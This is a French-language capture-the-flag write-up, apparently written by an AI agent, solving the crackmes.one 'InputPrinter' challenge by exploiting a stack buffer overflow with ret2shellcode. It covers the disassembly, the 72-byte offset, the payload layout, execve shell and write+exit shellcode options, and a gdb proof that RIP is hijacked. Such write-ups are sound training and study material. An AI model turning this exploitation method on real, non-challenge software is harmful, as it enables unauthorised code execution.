# khaledddd — InputPrinter

| | |
|---|---|
| **ID** | [`69fc5a3a3fba64e45dcea9ed`](https://crackmes.one/crackme/69fc5a3a3fba64e45dcea9ed) ([`ORIGIN.yml`](ORIGIN.yml)) |
| **Auteur** | khaledddd |
| **Plateforme** | Linux ELF64, **non-PIE**, non strippé (debug_info), GCC 16.1, `-fno-stack-protector`, pile **exécutable** (GNU_STACK RWE) |
| **Difficulté** | 2.0 |
| **SHA-256 (zip)** | `42870c1c…c55807c` |

## Fichiers

| Chemin | Rôle |
|---|---|
| `original/vuln` | binaire (nom interne : `vuln`, source embarquée `vuln.c`) |
| `tools/inputprinter-solve.py` | exploit : overflow + shellcode |
| `tools/gdb-proof-hijack.py` | script gdb : preuve du détournement de RIP |

## Réponse

Ce n'est pas un keygen mais un **stack buffer overflow** classique (`read(0, buf[64], 0xff)`, pas de canari). Le binaire lui-même **fuit l'adresse de son buffer** avant de lire l'entrée (`printf("%p\n", buf)`), et sa pile est marquée exécutable (`GNU_STACK` = RWE) avec un binaire non-PIE : c'est une invitation explicite au **ret2shellcode**.

```bash
python3 tools/inputprinter-solve.py --check
# fuite buf = 0x7ffd...
# PWNED!
# RIP detourne avec succes (banniere recue)
```

`--check` utilise un shellcode `write(1,"PWNED!\n",7); exit(0)` : preuve déterministe et portable du détournement du flot d'exécution, qui ne dépend pas d'un `execve()` (filtrable par un sandbox/CI). `--shell` lance le binaire avec le shellcode `execve("/bin/sh", …)` classique (23 octets) pour un **shell interactif** sur une machine sans filtrage syscall — c'est la solution « réelle » attendue par le challenge (chemin interne du binaire : `/home/khaled/Desktop/explt/shellcode`).

## Premier regard

```bash
file original/vuln
# ELF 64-bit LSB executable (pas "pie executable"), not stripped, with debug_info
readelf -l original/vuln | grep -A1 GNU_STACK
#   GNU_STACK ... RWE   <- pile executable, pas de NX
nm original/vuln | grep " T "
#   main, vuln
```

`strings` montre des chemins de compilation `/home/khaled/Desktop/explt/shellcode` et `GNU C23 16.1.1`, compilé avec `-g -fno-stack-protector` (visible dans le commentaire `GNU C23 …` embarqué) : **pas de canari**, symboles de debug présents, aucun obfuscation — le binaire est volontairement vulnérable.

## Flow

`main` ne fait qu'appeler `vuln()` :

```c
void vuln(void) {
    char buf[64];                 // rbp-0x40
    printf("%p\n", buf);          // fuite l'adresse du buffer AVANT de le remplir
    fflush(stdout);
    read(0, buf, 0xff);           // lit jusqu'a 255 octets -> overflow de 64+8=72 avant l'adresse de retour
    printf("you wrote: %s", buf);
}
```

## Comment on trouve

**Ancrage.** Binaire non strippé (`nm` donne directement `vuln` @ `0x401146`) : pas besoin d'IDA/decc, `objdump -d -M intel` suffit.

**Lecture asm** (`objdump -d --no-show-raw-insn`) :

```asm
401146: push   rbp
401147: mov    rbp,rsp
40114a: sub    rsp,0x40            ; buf[64] = [rbp-0x40 .. rbp-1]
40114e: lea    rax,[rbp-0x40]
401152: lea    rdx,[rip+0xeab]     ; "%p\n"
401159: mov    rsi,rax             ; printf("%p\n", &buf)  <- FUITE
...
401178: lea    rax,[rbp-0x40]
401181: mov    rsi,rax
401184: mov    edi,0x0
401189: call   401040 <read@plt>   ; read(0, &buf, 0xff)   <- OVERFLOW (0xff > 64)
...
4011aa: leave                       ; mov rsp,rbp ; pop rbp
4011ab: ret                         ; saute a [rsp] = adresse ecrasee par l'overflow
```

`.rodata` (`objdump -s -j .rodata`) donne les deux formats : `"%p\n"` @ `0x402004` et `"you wrote: %s"` @ `0x402008`.

**Calcul de l'offset.** `buf` est à `rbp-0x40` : il faut 0x40 (buffer) + 8 (ancien `rbp` sauvé par `push rbp`/`leave`) = **72 octets** de bourrage avant d'atteindre l'adresse de retour consommée par `ret`.

**Primitive.** Binaire **non-PIE** (`file` : `ELF … executable`, pas `pie executable`) → toutes les adresses du code sont fixes. La fuite `%p` donne l'adresse de la pile (ASLR de la pile, mais fournie gratuitement par le programme). `GNU_STACK` en `RWE` → la pile est exécutable, donc on peut y placer un shellcode et y sauter directement : **ret2shellcode**, sans ROP ni info leak supplémentaire à casser.

**Assemblage de l'exploit** (`tools/inputprinter-solve.py`) :
1. Lire la ligne `0x...` affichée par le programme → adresse de `buf`.
2. Payload = `shellcode` (≤72 octets) + `"A"*(72-len(shellcode))` + `adresse_de_buf` (8 octets LE).
3. Envoyer sur stdin ; `read()` écrit ce payload dans `buf`, en écrasant l'adresse de retour avec l'adresse de `buf` lui-même.
4. `leave; ret` saute dans `buf` → exécution du shellcode.

**Pièges.**
- Le shellcode `execve` classique ne doit pas contenir d'octet `0x00` (le `printf("you wrote: %s", buf)` juste avant le `ret` s'arrêterait au premier NUL — sans incidence sur l'exploit lui-même, seulement sur l'affichage cosmétique).
- `fflush` n'est appelé qu'après le premier `printf` (la fuite) ; le second `printf` (« you wrote ») n'est pas flush avant qu'on saute dans le shellcode — si celui-ci termine par un `exit()` direct (syscall `60`), ce texte n'apparaît jamais dans le terminal (comportement observé, sans impact sur la preuve).
- **Environnement d'exécution de cette session** : le `execve()` du shellcode shell est intercepté par le sandbox (syscall renvoyant `ENOSYS`) dans lequel cet agent tourne — mesure de confinement normale pour un outil d'IA, pas une propriété du challenge. `--check` utilise donc par défaut un shellcode `write`+`exit` (aucune dépendance à `execve`) pour une preuve automatisée reproductible ; `--shell` (avec le shellcode `execve` classique) donne un vrai shell sur une machine non sandboxée.

## Debug GDB (pas à pas)

Script complet : [`tools/gdb-proof-hijack.py`](tools/gdb-proof-hijack.py).

```bash
gdb -q -batch -ex "source tools/gdb-proof-hijack.py" ./original/vuln
```

1. `break *0x401189` (juste avant `call read@plt`) → `run` : à l'arrêt, `rax` contient l'adresse de `buf` (`lea rax,[rbp-0x40]` exécuté juste avant). GDB désactive l'ASLR par défaut (`disable-randomization on`), donc cette adresse est **stable** d'un `run` à l'autre dans la même session — on peut construire le payload *après* l'avoir observée, puis relancer avec.
2. Construction du payload avec cette adresse exacte (shellcode `write`+`exit` + bourrage + adresse), écrit dans un fichier, puis `run < payload.bin`.
3. `break *0x4011aa` (juste avant `leave`) → inspection de la pile : `*(rbp+8)` (l'adresse de retour) vaut bien l'adresse de `buf` écrasée par l'overflow.
4. `stepi 2` (exécute `leave` puis `ret`) → `$rip` vaut exactement l'adresse de `buf`, et les 3 premiers octets lus à cette adresse sont `eb 19 5e` (début du shellcode) : **détournement du flot d'exécution confirmé**.

Sortie observée (adresses PIE-free, stables sous gdb) :

```
PROOF buf_addr        = 0x7fffffffd970
PROOF saved_ret        = 0x7fffffffd970 (== buf_addr ? True)
PROOF rip_after_ret     = 0x7fffffffd970 (== buf_addr ? True)
PROOF bytes_at_rip      = eb195e
```

Piège : sans `disable-randomization` (par défaut activé dans gdb), il faut faire les deux `run` dans la **même session gdb** pour réutiliser l'adresse apprise au premier arrêt — un nouveau process gdb redonnerait une adresse différente.

## Vérification

```bash
python3 tools/inputprinter-solve.py --check
# fuite buf = 0x7ffd...
# PWNED!
# RIP detourne avec succes (banniere recue)
```

KO (sans exploiter) :

```bash
printf 'hello\n' | ./original/vuln
# 0x7fff...
# you wrote: hello
```

Entrée courte : fonctionne normalement (pas d'overflow, juste un echo). Entrée > 72 octets sans adresse de retour valide : `Segmentation fault`.

## Notes

- Ce n'est **pas** un patch binaire : la vulnérabilité (buffer sans canari, pile exécutable, auto-fuite d'adresse) est la fonctionnalité du challenge, pas un bug qu'on contourne.
- Pas de mot de passe / serial : la « réponse » est l'exploit lui-même (obtenir l'exécution de code arbitraire), documenté avec deux charges utiles (preuve automatisée sans `execve`, et shell interactif classique).
